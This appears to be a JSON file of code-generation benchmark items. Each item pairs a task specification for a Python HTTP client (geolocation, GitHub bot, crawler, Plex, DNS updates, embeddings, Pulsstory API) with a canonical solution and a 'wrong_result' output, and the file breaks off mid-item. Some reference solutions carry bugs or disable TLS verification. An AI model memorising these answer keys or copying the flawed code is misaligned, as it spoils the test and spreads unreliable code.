[
  {
    "Task_id": 101,
    "Instruction": "Task Description: Create a Python class that implements a ScalarFunction to retrieve geographic location information for a given IP address using an external API.\n\nClass Description: The GetLocation class extends PyFlink's ScalarFunction to provide IP-to-location functionality. It makes HTTP requests to the ip2location.io API and processes the response to extract country, state, and city information.\n\nAttributes: None\n\nMethods:\n- eval(ip_address: str) -> str: \n  Takes an IP address as input, queries the ip2location.io API, and returns a JSON string containing the country code, region name, and city name. If the request fails, returns an empty JSON object. The API key is retrieved from environment variables.\n\n  Input Parameters:\n  - ip_address: str - The IP address to look up\n\n  Return Type:\n  - str - JSON string containing location information in format {'country': str, 'state': str, 'city': str} or empty object if request fails",
    "Canonical_solution": "import os\nimport json\nimport requests\nfrom pyflink.table.udf import ScalarFunction\nfrom pyflink.table import DataTypes\n\nclass GetLocation(ScalarFunction):\n    def eval(self, ip_address):\n        url = \"https://api.ip2location.io\"\n        response = requests.get(url, params={\n            'ip': ip_address,\n            'key': os.environ.get(\"IP_CODING_KEY\")\n        })\n\n        if response.status_code != 200:\n            return json.dumps({})\n\n        data = json.loads(response.text)\n        country = data.get('country_code', '')\n        state = data.get('region_name', '')\n        city = data.get('city_name', '')\n        return json.dumps({'country': country, 'state': state, 'city': city})",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "import os\nimport requests\nfrom pyflink.common import ScalarFunction\nimport json\n\n\nclass GetLocation(ScalarFunction):\n    def eval(self, ip_address: str) -> str:\n        api_key = os.getenv('IP2LOCATION_API_KEY')\n        if not api_key:\n            return '{}'\n\n        url = f'https://api.ip2location.io/{ip_address}?key={api_key}'\n        try:\n            response = requests.get(url)\n            data = response.json()\n            if response.status_code == 200:\n                location_info = {\n                    'country': data.get('country_name', ''),\n                    'state': data.get('region_name', ''),\n                    'city': data.get('city', '')\n                }\n                return json.dumps(location_info)\n            else:\n                return '{}'\n        except Exception:\n            return '{}'"
  },
  {
    "Task_id": 102,
    "Instruction": "Task Description: Create a function that handles GitHub webhook events for pull requests, fetches a random meme from an API, and posts it as a comment on the pull request.\n\nFunction Description: The function `bot()` is a webhook handler that processes GitHub pull request events. When a pull request is opened, it authenticates with the GitHub API, fetches a random meme from an external API, and posts the meme as a comment on the pull request. The function uses the `requests` library for HTTP communication with the meme API and the `PyGithub` library for GitHub interactions.\n\nInput: \n- The function receives a Flask `request` object containing JSON payload from GitHub webhook. The payload includes:\n  - `action`: The event type (e.g., \"opened\")\n  - `pull_request`: Details about the pull request\n  - `repository`: Information about the repository containing owner and name\n\nOutput: \n- Returns \"ok\" string in all cases (success or failure) to acknowledge webhook receipt\n- As a side effect, posts a meme comment on the pull request when conditions are met",
    "Canonical_solution": "import os\nimport requests\nfrom dotenv import load_dotenv\nfrom flask import Flask, request\nfrom github import Github, GithubIntegration\n\nload_dotenv()\n\n__flask_app_name__ = 'github_bot'\napp = Flask(__flask_app_name__)\napp_id = int(os.environ['GITHUB_APP_ID'])\nwith open(\n        os.path.normpath(os.path.expanduser(os.getenv(\"GITHUB_PRIVATE_KEY_FILE\", '~/.certs/github/bot_key.pem'))),\n        'r'\n) as cert_file:\n    app_key = cert_file.read()\n\ngit_integration = GithubIntegration(\n    app_id,\n    app_key,\n)\n\ndef bot():\n    payload = request.json\n    if not all(k in payload.keys() for k in ['action', 'pull_request']) and \\\n            payload['action'] == 'opened':\n        return \"ok\"\n    owner = payload['repository']['owner']['login']\n    repo_name = payload['repository']['name']\n    git_connection = Github(\n        login_or_token=git_integration.get_access_token(\n            git_integration.get_installation(owner, repo_name).id\n        ).token\n    )\n    repo = git_connection.get_repo(f\"{owner}/{repo_name}\")\n    issue = repo.get_issue(number=payload['pull_request']['number'])\n    response = requests.get(url='https://meme-api.herokuapp.com/gimme')\n    if response.status_code != 200:\n        return 'ok'\n    meme_url = response.json()['preview'][-1]\n    issue.create_comment(f\"![Alt Text]({meme_url})\")\n    return \"ok\"",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport os\nimport requests\nfrom flask import request\nfrom github import Github\n\ndef bot():\n    payload = request.json\n\n    if payload.get('action') != 'opened' or 'pull_request' not in payload:\n        return \"ok\"\n\n    pr_url = payload['pull_request']['url']\n    repo_full_name = payload['repository']['full_name']\n\n    GITHUB_TOKEN = os.getenv('GITHUB_TOKEN')\n    g = Github(GITHUB_TOKEN)\n    repo_owner, repo_name = repo_full_name.split('/')\n    repo = g.get_repo(f\"{repo_owner}/{repo_name}\")\n    pr_number = int(pr_url.split('/')[-1])\n    pr = repo.get_pull(pr_number)\n\n    meme_api_url = 'https://api.memegen.link/overlay/random'\n    response = requests.get(meme_api_url)\n    meme_data = response.json()\n    meme_url = meme_data['url']\n\n    pr.create_issue_comment(f\"Here's a random meme for your PR! \ud83c\udf89\\n{meme_url}\")\n\n    return \"ok\"\n```"
  },
  {
    "Task_id": 103,
    "Instruction": "Task Description: Create a function that sends audio and transcript files to a server for processing using HTTP POST request and handles the response.\n\nFunction Description: The function `gentle_request` sends a WAV audio file and its corresponding transcript text file to a specified server using an HTTP POST request. It checks if the filenames match, reads the transcript content, and sends both files to the server. The function handles the server response, checks for errors, and optionally prints debug information.\n\nInput:\n- `wav_path` [str] - Path to the WAV audio file to be sent.\n- `txt_path` [str] - Path to the transcript text file corresponding to the audio.\n- `server_addr` [str] - IP address or hostname of the server.\n- `port` [int] - Port number on which the server is listening.\n- `debug` [bool, optional] - If True, prints the server response in JSON format. Default is False.\n\nOutput:\n- `response` [requests.Response or None] - The server's HTTP response object if the request is successful, otherwise None. The response can be parsed for status code, headers, and content.",
    "Canonical_solution": "from docopt import docopt\nfrom glob import glob\nfrom tqdm import tqdm\nimport os.path\nimport requests\nimport numpy as np\n\ndef gentle_request(wav_path,txt_path, server_addr, port, debug=False):\n    print('\\n')\n    response = None\n    wav_name = os.path.basename(wav_path)\n    txt_name = os.path.basename(txt_path)\n    if os.path.splitext(wav_name)[0] != os.path.splitext(txt_name)[0]:\n        print(' [!] wav name and transcript name does not match - exiting...')\n        return response\n    with open(txt_path, 'r', encoding='utf-8-sig') as txt_file:\n        print('Transcript - '+''.join(txt_file.readlines()))\n    with open(wav_path,'rb') as wav_file, open(txt_path, 'rb') as txt_file:\n        params = (('async','false'),)\n        files={'audio':(wav_name,wav_file),\n               'transcript':(txt_name,txt_file),\n               }\n        server_path = 'http://'+server_addr+':'+str(port)+'/transcriptions'\n        response = requests.post(server_path, params=params,files=files)\n        if response.status_code != 200:\n            print(' [!] External server({}) returned bad response({})'.format(server_path, response.status_code))\n    if debug:\n        print('Response')\n        print(response.json())\n    return response",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport os\nimport requests\n\ndef gentle_request(wav_path, txt_path, server_addr, port, debug=False):\n    if not (os.path.basename(wav_path).rsplit('.', 1)[0] == os.path.basename(txt_path).rsplit('.', 1)[0]):\n        print(\"Error: WAV and TXT filenames do not match.\")\n        return None\n\n    with open(txt_path, 'r') as f:\n        transcript = f.read()\n\n    files = {\n        'audio': open(wav_path, 'rb'),\n        'transcript': (os.path.basename(txt_path), transcript)\n    }\n\n    url = f'http://{server_addr}:{port}'\n    try:\n        response = requests.post(url, files=files)\n        response.raise_for_status()\n    except requests.RequestException as e:\n        print(f\"Request failed: {e}\")\n        return None\n    finally:\n        files['audio'].close()\n\n    if debug:\n        print(response.json())\n\n    return response\n```"
  },
  {
    "Task_id": 108,
    "Instruction": "Task Description: Implement a web crawler class that can fetch HTML content from single or multiple URLs, with support for threaded operations and error handling.\n\nClass Description: SimpleCrawler is a class designed to fetch HTML content from web pages either individually or in parallel using threading. It handles various HTTP request scenarios and errors while maintaining proper logging.\n\nAttributes:\n_results: dict - Stores fetched HTML content when operating in threaded mode\nMAX_FILE_SIZE: int - Maximum allowed file size for fetched content (20MB)\nMIN_FILE_SIZE: int - Minimum allowed file size for fetched content (10 bytes)\nLOGGER: Logger - Logger instance for error and debug messages\nUSER_AGENT: str - User agent string for HTTP requests\nHEADERS: dict - Default headers for HTTP requests\n\nMethods:\nfetch_url(url: str, request_args: dict = None) -> str - Fetches HTML content from a single URL\nInput:\n  url: str - URL to fetch\n  request_args: dict (optional) - Additional arguments for the request\nOutput:\n  str - HTML content of the URL or None if failed\n\n_fetch_url(url: str, is_threaded: bool, request_args: dict = None) -> str - Internal method that performs the actual URL fetching\nInput:\n  url: str - URL to fetch\n  is_threaded: bool - Flag indicating if operation is threaded\n  request_args: dict (optional) - Additional arguments for the request\nOutput:\n  str - HTML content of the URL or None if failed\n\nfetch_urls(urls: list, request_args: dict = None) -> dict - Fetches HTML content from multiple URLs in parallel using threads\nInput:\n  urls: list - List of URLs to fetch\n  request_args: dict (optional) - Additional arguments for the requests\nOutput:\n  dict - Dictionary mapping URLs to their HTML content",
    "Canonical_solution": "import socket\nimport copy\nimport threading\nimport logging\nimport requests\nimport urllib3\nfrom .response_decoder import decode_response\n\nMAX_FILE_SIZE = 20000000\nMIN_FILE_SIZE = 10\n\nLOGGER = logging.getLogger(__name__)\nUSER_AGENT = \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\"\nHEADERS = {\n    \"Connection\": \"close\",\n    \"User-Agent\": USER_AGENT,\n}\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\nclass SimpleCrawler:\n    _results = {}\n\n    def __init__(self):\n        pass\n\n    def fetch_url(self, url, request_args=None):\n        \"\"\"\n        Crawls the html content of the parameter url and returns the html\n        :param url: URL to fetch\n        :param request_args: optional arguments that `request` takes\n        :return: HTML content of the URL\n        \"\"\"\n        return self._fetch_url(url, False, request_args=request_args)\n\n    def _fetch_url(self, url, is_threaded, request_args=None):\n        \"\"\"\n        Crawls the html content of the parameter url and saves the html in _results\n        :param url: URL to fetch\n        :param is_threaded: If True, results will be stored for later processing\n        :param request_args: optional arguments that `request` takes\n        :return: html of the url\n        \"\"\"\n        if request_args is None:\n            request_args = {}\n        if \"headers\" not in request_args:\n            request_args[\"headers\"] = HEADERS\n\n        html_str = None\n        try:\n            response = requests.get(\n                url, verify=False, allow_redirects=True, **request_args)\n            \n            if response.status_code != 200:\n                LOGGER.error(\"not a 200 response: %s\", response.status_code)\n            elif response.text is None or len(response.text) < MIN_FILE_SIZE:\n                LOGGER.error(\"too small/incorrect: %s %s\", url, len(response.text))\n            elif len(response.text) > MAX_FILE_SIZE:\n                LOGGER.error(\"too large: %s %s\", url, len(response.text))\n            else:\n                html_str = decode_response(response)\n                \n        except (requests.exceptions.MissingSchema, requests.exceptions.InvalidURL):\n            LOGGER.error(\"malformed URL: %s\", url)\n        except requests.exceptions.TooManyRedirects:\n            LOGGER.error(\"too many redirects: %s\", url)\n        except requests.exceptions.SSLError as err:\n            LOGGER.error(\"SSL: %s %s\", url, err)\n        except (socket.timeout, requests.exceptions.ConnectionError, \n               requests.exceptions.Timeout, socket.error, socket.gaierror) as err:\n            LOGGER.error(\"connection/timeout error: %s %s\", url, err)\n            \n        if is_threaded:\n            self._results[url] = html_str\n        return html_str\n\n    def fetch_urls(self, urls, request_args=None):\n        \"\"\"\n        Crawls the html content of all given urls in parallel.\n        :param urls: List of URLs to fetch\n        :param request_args: optional arguments that `request` takes\n        :return: Dictionary of URL to HTML content mappings\n        \"\"\"\n        threads = [\n            threading.Thread(target=self._fetch_url, args=(url, True, request_args))\n            for url in urls\n        ]\n        for thread in threads:\n            thread.start()\n        for thread in threads:\n            thread.join()\n\n        results = copy.deepcopy(self._results)\n        self._results = {}\n        return results",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport threading\nimport requests\nfrom urllib.parse import urlparse\nimport logging\n\nclass SimpleCrawler:\n    _results = {}\n    MAX_FILE_SIZE = 20 * 1024 * 1024  # 20MB\n    MIN_FILE_SIZE = 10  # 10 bytes\n    LOGGER = logging.getLogger(__name__)\n    USER_AGENT = 'SimpleCrawler/1.0'\n    HEADERS = {'User-Agent': USER_AGENT}\n\n    def fetch_url(self, url: str, request_args: dict = None) -> str:\n        return self._fetch_url(url, is_threaded=False, request_args=request_args)\n\n    def _fetch_url(self, url: str, is_threaded: bool, request_args: dict = None) -> str:\n        try:\n            headers = self.HEADERS.copy()\n            if request_args and 'headers' in request_args:\n                headers.update(request_args['headers'])\n\n            response = requests.get(url, headers=headers, timeout=10, **(request_args or {}))\n            response.raise_for_status()\n\n            content_length = int(response.headers.get('Content-Length', 0))\n            if content_length < self.MIN_FILE_SIZE or content_length > self.MAX_FILE_SIZE:\n                self.LOGGER.warning(f\"File size for {url} is out of allowed range.\")\n                return None\n\n            return response.text\n        except Exception as e:\n            self.LOGGER.error(f\"Error fetching {url}: {str(e)}\")\n            return None\n\n    def fetch_urls(self, urls: list, request_args: dict = None) -> dict:\n        threads = []\n        self._results = {}\n\n        def thread_task(url):\n            result = self._fetch_url(url, is_threaded=True, request_args=request_args)\n            self._results[url] = result\n\n        for url in urls:\n            thread = threading.Thread(target=thread_task, args=(url,))\n            threads.append(thread)\n            thread.start()\n\n        for thread in threads:\n            thread.join()\n\n        return self._results\n```"
  },
  {
    "Task_id": 109,
    "Instruction": "Task Description: Implement a Python class to interact with a Plex Media Server using HTTP requests, including functionality for making authenticated requests, validating server connections, and updating media libraries.\n\nClass Description: PlexMediaServer is a class that provides methods to communicate with a Plex Media Server instance. It handles HTTP requests with proper authentication, validates server connections and library access, and triggers library updates.\n\nAttributes:\n- TIMEOUT: [int] - Default timeout in seconds for HTTP requests\n- object: [object] - The media server instance containing configuration options\n\nMethods:\n- __init__(mediaserver_instance: object) -> None - Initializes the PlexMediaServer with a media server instance containing configuration options\n- make_request(uri: str = '/', params: dict = {}) -> requests.Response - Makes an authenticated HTTP GET request to the Plex server with proper headers and SSL verification handling\n- validate() -> bool - Validates the connection to the Plex server and checks if configured libraries exist, raising exceptions for any issues\n- update() -> bool - Triggers refresh operations for all configured libraries, raising exceptions for any failures",
    "Canonical_solution": "import requests\nfrom urllib.parse import urlsplit, urlunsplit, urlencode\nimport warnings\n\nclass PlexMediaServer:\n    TIMEOUT = 5\n\n    def __init__(self, mediaserver_instance):\n        self.object = mediaserver_instance\n\n    def make_request(self, uri='/', params={}):\n        headers = {'User-Agent': 'TubeSync'}\n        token = self.object.loaded_options['token']\n        params['X-Plex-Token'] = token\n        base_parts = urlsplit(self.object.url)\n        qs = urlencode(params)\n        url = urlunsplit((base_parts.scheme, base_parts.netloc, uri, qs, ''))\n        \n        if self.object.verify_https:\n            return requests.get(url, headers=headers, verify=True, timeout=self.TIMEOUT)\n        else:\n            with warnings.catch_warnings():\n                warnings.simplefilter(\"ignore\")\n                return requests.get(url, headers=headers, verify=False, timeout=self.TIMEOUT)\n\n    def validate(self):\n        try:\n            response = self.make_request('/library/sections')\n            if response.status_code != 200:\n                check_token = ''\n                if 400 <= response.status_code < 500:\n                    check_token = (' A 4XX error could mean your access token is being rejected.')\n                raise Exception(f'Invalid HTTP status code: {response.status_code}.' + check_token)\n            \n            parsed_response = ElementTree.fromstring(response.content)\n            remote_libraries = {}\n            for parent in parsed_response.iter('MediaContainer'):\n                for d in parent:\n                    library_id = d.attrib['key']\n                    library_name = d.attrib['title']\n                    remote_libraries[library_id] = library_name\n            \n            libraries = self.object.loaded_options['libraries'].strip().split(',')\n            for library_id in libraries:\n                library_id = library_id.strip()\n                if library_id not in remote_libraries:\n                    raise Exception(f'Library ID \"{library_id}\" does not exist on Plex Media Server')\n            return True\n            \n        except Exception as e:\n            raise Exception(f'Validation failed: {str(e)}')\n\n    def update(self):\n        libraries = self.object.loaded_options.get('libraries', '')\n        for library_id in libraries.split(','):\n            library_id = library_id.strip()\n            uri = f'/library/sections/{library_id}/refresh'\n            response = self.make_request(uri)\n            if response.status_code != 200:\n                raise Exception(f'Failed to refresh library \"{library_id}\", status code: {response.status_code}')\n        return True",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\n\nclass PlexMediaServer:\n    TIMEOUT = 30\n\n    def __init__(self, mediaserver_instance: object) -> None:\n        self.object = mediaserver_instance\n        self.base_url = f\"{self.object.scheme}://{self.object.host}:{self.object.port}\"\n        self.token = self.object.token\n        self.libraries = self.object.libraries\n\n    def make_request(self, uri: str = '/', params: dict = {}) -> requests.Response:\n        headers = {'X-Plex-Token': self.token, 'Accept': 'application/json'}\n        url = self.base_url + uri\n        response = requests.get(url, params=params, headers=headers, timeout=self.TIMEOUT, verify=self.object.ssl_verify)\n        response.raise_for_status()\n        return response\n\n    def validate(self) -> bool:\n        try:\n            self.make_request('/')\n            for library in self.libraries:\n                path = f\"/library/sections/{library['key']}\"\n                self.make_request(path)\n        except requests.exceptions.RequestException as e:\n            raise Exception(f\"Failed to connect to or validate libraries on Plex server: {e}\")\n        return True\n\n    def update(self) -> bool:\n        if not self.validate():\n            raise Exception(\"Library validation failed before attempting to update\")\n        for library in self.libraries:\n            path = f\"/library/sections/{library['key']}/refresh\"\n            try:\n                self.make_request(path)\n            except requests.exceptions.RequestException as e:\n                raise Exception(f\"Failed to refresh library '{library['name']}': {e}\")\n        return True\n```"
  },
  {
    "Task_id": 11,
    "Instruction": "Task Description: Implement a Python class to interact with Hurricane Electric's dynamic DNS API for updating DNS records programmatically.\n\nClass Description: HurricaneElectricAPI is a client class that handles communication with Hurricane Electric's DNS service to update DNS records. It supports both direct connections and proxy connections.\n\nAttributes:\n- SITE: [str] - The target domain for the Hurricane Electric API (dyn.dns.he.net)\n- METHOD: [str] - The HTTP method to use for requests (POST)\n- ACTION: [str] - The API endpoint path (nic/update)\n- TOKEN_PARAM: [str] - The parameter name for the authentication token (password)\n- TOKEN: [str] - The authentication token/password for API access\n- PROXY: [str/None] - Optional proxy server address\n\nMethods:\n- __init__(token=\"password\", proxy=None) -> None - Initializes the API client with optional token and proxy settings\n- _request(param=None, **params) -> str - Internal method to make HTTP requests to the API\n- update_record(domain, value, record_type=\"A\") -> str - Updates a DNS record with the given value\n\nMethod Details:\n1. _request(param=None, **params) -> str\n   - Makes an HTTPS request to the Hurricane Electric API\n   - Input:\n     - param: [dict/None] - Optional base parameters\n     - **params: Additional request parameters\n   - Output: [str] - API response string\n   - Raises Exception on HTTP errors or API failures\n\n2. update_record(domain, value, record_type=\"A\") -> str\n   - Updates a DNS record with the specified value\n   - Input:\n     - domain: [str] - The domain name to update\n     - value: [str] - The new IP address or value\n     - record_type: [str] - The DNS record type (default: \"A\")\n   - Output: [str] - Human-readable status message about the update\n   - Raises Exception if the update fails",
    "Canonical_solution": "from http.client import HTTPSConnection\nfrom urllib.parse import urlencode\nfrom logging import info, debug, warning\n\nclass HurricaneElectricAPI:\n    def __init__(self, token=\"password\", proxy=None):\n        self.SITE = \"dyn.dns.he.net\"\n        self.METHOD = \"POST\"\n        self.ACTION = \"nic/update\"\n        self.TOKEN_PARAM = \"password\"\n        self.TOKEN = token\n        self.PROXY = proxy\n\n    def _request(self, param=None, **params):\n        if param:\n            params.update(param)\n\n        params.update({self.TOKEN_PARAM: '***'})\n        info(\"%s/%s : %s\", self.SITE, self.ACTION, params)\n        params[self.TOKEN_PARAM] = self.TOKEN\n\n        if self.PROXY:\n            conn = HTTPSConnection(self.PROXY)\n            conn.set_tunnel(self.SITE, 443)\n        else:\n            conn = HTTPSConnection(self.SITE)\n\n        conn.request(self.METHOD, '/' + self.ACTION, urlencode(params), {\n            \"Content-type\": \"application/x-www-form-urlencoded\"\n        })\n        response = conn.getresponse()\n        res = response.read().decode('utf8')\n        conn.close()\n\n        if response.status < 200 or response.status >= 300:\n            warning('%s : error[%d]:%s', self.ACTION, response.status, res)\n            raise Exception(res)\n        else:\n            debug('%s : result:%s', self.ACTION, res)\n            if not res:\n                raise Exception(\"empty response\")\n            elif res[:5] == \"nochg\" or res[:4] == \"good\":\n                return res\n            else:\n                raise Exception(res)\n\n    def update_record(self, domain, value, record_type=\"A\"):\n        info(\">>>>>%s(%s)\", domain, record_type)\n        res = self._request(hostname=domain, myip=value)\n        if res[:4] == \"good\":\n            result = \"Record updated. New IP is: \" + res[5:-1]\n        elif res[:5] == \"nochg\":\n            result = \"IP not changed. IP is: \" + res[6:-1]\n        else:\n            result = \"Record update failed.\"\n        return result",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nimport requests\n\nclass HurricaneElectricAPI:\n    SITE = \"https://dyn.dns.he.net\"\n    METHOD = \"POST\"\n    ACTION = \"/nic/update\"\n    TOKEN_PARAM = \"password\"\n    PROXY = None\n\n    def __init__(self, token=\"password\", proxy=None):\n        self.TOKEN = token\n        if proxy:\n            self.PROXY = {\"http\": proxy, \"https\": proxy}\n\n    def _request(self, param=None, **params):\n        headers = {\n            \"User-Agent\": \"HurricaneElectricAPI/1.0\",\n        }\n        data = {self.TOKEN_PARAM: self.TOKEN}\n        if param:\n            data.update(param)\n        data.update(params)\n\n        try:\n            response = requests.request(\n                self.METHOD,\n                f\"{self.SITE}{self.ACTION}\",\n                headers=headers,\n                params=data,\n                proxies=self.PROXY,\n                timeout=10\n            )\n            response.raise_for_status()\n            return response.text.strip()\n        except requests.exceptions.RequestException as e:\n            raise Exception(f\"Request failed: {e}\")\n\n    def update_record(self, domain, value, record_type=\"A\"):\n        params = {\n            \"hostname\": domain,\n            \"myip\": value,\n            \"type\": record_type\n        }\n        result = self._request(params=params)\n        if not result.startswith(\"good\") and not result.startswith(\"nochg\"):\n            raise Exception(f\"DNS update failed: {result}\")\n        return result\n```"
  },
  {
    "Task_id": 110,
    "Instruction": "Task Description: Create a function that retrieves word embeddings from either a local API or OpenAI's API based on the specified model.\n\nFunction Description: The function `get_embedding_from_api` fetches a word embedding vector by making an HTTP POST request to a local API endpoint or using OpenAI's API, depending on the model specified. It handles the response, checks for errors, and returns the embedding as a NumPy array if successful.\n\nInput:\n- `word` (str): The input word or text for which to generate an embedding.\n- `model` (str, optional): The name of the model to use for generating embeddings. Defaults to \"vicuna-7b-v1.1\". If the model name contains \"ada\", it uses OpenAI's API.\n\nOutput:\n- Returns a NumPy array containing the word embedding if the request is successful.\n- Returns None if an error occurs (prints the error details to the console).",
    "Canonical_solution": "import json\nimport requests\nimport numpy as np\n\ndef get_embedding_from_api(word, model=\"vicuna-7b-v1.1\"):\n    if \"ada\" in model:\n        resp = openai.Embedding.create(\n            model=model,\n            input=word,\n        )\n        embedding = np.array(resp[\"data\"][0][\"embedding\"])\n        return embedding\n\n    url = \"http://localhost:8000/v1/embeddings\"\n    headers = {\"Content-Type\": \"application/json\"}\n    data = json.dumps({\"model\": model, \"input\": word})\n\n    response = requests.post(url, headers=headers, data=data)\n    if response.status_code == 200:\n        embedding = np.array(response.json()[\"data\"][0][\"embedding\"])\n        return embedding\n    else:\n        print(f\"Error: {response.status_code} - {response.text}\")\n        return None",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport numpy as np\nimport requests\nimport openai\n\ndef get_embedding_from_api(word, model=\"vicuna-7b-v1.1\"):\n    if \"ada\" in model:\n        try:\n            response = openai.Embedding.create(input=word, model=model)\n            embedding = response['data'][0]['embedding']\n            return np.array(embedding)\n        except Exception as e:\n            print(f\"OpenAI API error: {e}\")\n            return None\n    else:\n        try:\n            response = requests.post(\"http://localhost:5000/embed\", json={\"text\": word, \"model\": model})\n            response.raise_for_status()\n            data = response.json()\n            return np.array(data[\"embedding\"])\n        except requests.exceptions.RequestException as e:\n            print(f\"Local API request error: {e}\")\n            return None\n```"
  },
  {
    "Task_id": 112,
    "Instruction": "Task Description: Create a Python class that implements an HTTP client for interacting with the Pulsstory ExternalSyncAPI, handling authentication, data retrieval, and activity synchronization.\n\nClass Description: The PulsstoryHTTPClient class provides methods to interact with the Pulsstory API, including user authentication, activity download/upload, and token management. It handles HTTP requests, error responses, and data serialization.\n\nAttributes:\n- URLBase: str - The base URL for all API endpoints\n- PULSSTORY_CLIENT_ID: str - Client ID for API authentication\n- PULSSTORY_CLIENT_SECRET: str - Client secret for API authentication\n\nMethods:\n- _api_request(endpoint: str, service_record: object = None, method: str = \"POST\", data: dict = None, headers: dict = None, files: dict = None) -> dict - Internal method to make API requests and handle responses\n- _apiData(service_record: object) -> dict - Helper method to prepare authentication data\n- get_user_id(service_record: object) -> str - Retrieves user ID from the API\n- get_api_uris(service_record: object) -> dict - Gets API endpoint URIs from the service\n- retrieve_authorization_token(code: str) -> str - Exchanges an authorization code for an access token\n- revoke_authorization(service_record: object) -> None - Revokes an existing authorization\n- download_activity(service_record: object, activity_id: str) -> dict - Downloads activity data\n- upload_activity(service_record: object, upload_data: dict, uris: dict) -> str - Uploads activity data as a compressed file",
    "Canonical_solution": "from tapiriik.settings import PULSSTORY_CLIENT_ID, PULSSTORY_CLIENT_SECRET\nimport requests\nimport urllib.parse\nimport json\n\nclass PulsstoryHTTPClient:\n    def __init__(self, base_url, client_id=None, client_secret=None):\n        self.URLBase = base_url\n        self.PULSSTORY_CLIENT_ID = client_id or PULSSTORY_CLIENT_ID\n        self.PULSSTORY_CLIENT_SECRET = client_secret or PULSSTORY_CLIENT_SECRET\n\n    def _api_request(self, endpoint, service_record=None, method=\"POST\", data=None, headers=None, files=None):\n        url = self.URLBase + endpoint\n        request_data = self._apiData(service_record) if service_record else {}\n        if data:\n            request_data.update(data)\n        \n        if method == \"POST\":\n            response = requests.post(url, data=request_data, headers=headers, files=files)\n        else:\n            raise ValueError(\"Unsupported HTTP method\")\n\n        if response.status_code != 200:\n            if response.status_code in [401, 403]:\n                raise APIException(\"No authorization for request\", block=True, user_exception=UserException(UserExceptionType.Authorization, intervention_required=True))\n            raise APIException(f\"Request failed with status {response.status_code}: {response.text}\")\n\n        return response.json()\n\n    def _apiData(self, service_record):\n        return {\"access_token\": service_record.Authorization[\"Token\"]}\n\n    def get_user_id(self, service_record):\n        return self._api_request(\"/ExternalSyncAPI/GetUserId\", service_record)[\"userID\"]\n\n    def get_api_uris(self, service_record):\n        uris = self._api_request(\"/ExternalSyncAPI/Uris\", service_record)\n        for k in uris.keys():\n            if isinstance(uris[k], str):\n                uris[k] = self.URLBase + uris[k]\n        return uris\n\n    def retrieve_authorization_token(self, code):\n        params = {\n            \"code\": code,\n            \"client_id\": self.PULSSTORY_CLIENT_ID,\n            \"client_secret\": self.PULSSTORY_CLIENT_SECRET\n        }\n        response = requests.post(\n            self.URLBase + \"/ExternalSyncAPI/GenerateToken\",\n            data=urllib.parse.urlencode(params),\n            headers={\"Content-Type\": \"application/x-www-form-urlencoded\"}\n        )\n        if response.status_code != 200:\n            raise APIException(\"Invalid code\")\n        return response.json()[\"access_token\"]\n\n    def revoke_authorization(self, service_record):\n        response = requests.post(self.URLBase + \"/ExternalSyncAPI/Deauthorize\", data=self._apiData(service_record))\n        if response.status_code not in [200, 204]:\n            raise APIException(f\"Unable to deauthorize token, status {response.status_code}\")\n\n    def download_activity(self, service_record, activity_id):\n        return self._api_request(activity_id, service_record)\n\n    def upload_activity(self, service_record, upload_data, uris):\n        json_data = json.dumps(upload_data)\n        buffer = io.BytesIO()\n        with zipfile.ZipFile(buffer, 'w') as myzip:\n            myzip.writestr('activity.txt', json_data, compress_type=zipfile.ZIP_DEFLATED)\n        files = {\"data\": buffer.getvalue()}\n        return self._api_request(uris[\"upload_activity_zip\"], service_record, files=files)[\"Id\"]",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\nimport json\nimport os\nfrom datetime import datetime\n\n\nclass PulsstoryHTTPClient:\n    URLBase = \"https://api.pulsstory.com/external-sync\"\n    PULSSTORY_CLIENT_ID = os.getenv(\"PULSSTORY_CLIENT_ID\")\n    PULSSTORY_CLIENT_SECRET = os.getenv(\"PULSSTORY_CLIENT_SECRET\")\n\n    def _api_request(self, endpoint: str, service_record=None, method: str = \"POST\", data: dict = None, headers: dict = None, files: dict = None) -> dict:\n        url = f\"{self.URLBase}{endpoint}\"\n        if not headers:\n            headers = {\n                \"Content-Type\": \"application/json\",\n                \"Authorization\": f\"Bearer {service_record.get('access_token')}\"\n            }\n        try:\n            response = requests.request(\n                method=method,\n                url=url,\n                headers=headers,\n                data=json.dumps(data) if data else None,\n                files=files\n            )\n            response.raise_for_status()\n            return response.json() if response.content else {}\n        except requests.exceptions.RequestException as e:\n            raise Exception(f\"API request failed: {e}\")\n\n    def _apiData(self, service_record: object) -> dict:\n        return {\n            \"client_id\": self.PULSSTORY_CLIENT_ID,\n            \"client_secret\": self.PULSSTORY_CLIENT_SECRET,\n            \"access_token\": service_record.get(\"access_token\"),\n            \"refresh_token\": service_record.get(\"refresh_token\"),\n            \"token_expires_at\": service_record.get(\"token_expires_at\")\n        }\n\n    def get_user_id(self, service_record: object) -> str:\n        endpoint = \"/user/id\"\n        response = self._api_request(endpoint, service_record)\n        return response.get(\"user_id\")\n\n    def get_api_uris(self, service_record: object) -> dict:\n        endpoint = \"/api/uris\"\n        response = self._api_request(endpoint, service_record)\n        return response.get(\"uris\")\n\n    def retrieve_authorization_token(self, code: str) -> str:\n        token_url = f\"{self.URLBase}/auth/token\"\n        payload = {\n            \"grant_type\": \"authorization_code\",\n            \"code\": code,\n            \"client_id\": self.PULSSTORY_CLIENT_ID,\n            \"client_secret\": self.PULSSTORY_CLIENT_SECRET\n        }\n        headers = {\"Content-Type\": \"application/x-www-form-urlencoded\"}\n        response = requests.post(token_url, data=payload, headers=headers)\n        response.raise_for_status()\n        token_data = response.json()\n        return token_data.get(\"access_token\")\n\n    def revoke_authorization(self, service_record: object) -> None:\n        endpoint = \"/auth/revoke\"\n        payload = {\n            \"token\": service_record.get(\"access_token\"),\n            \"client_id\": 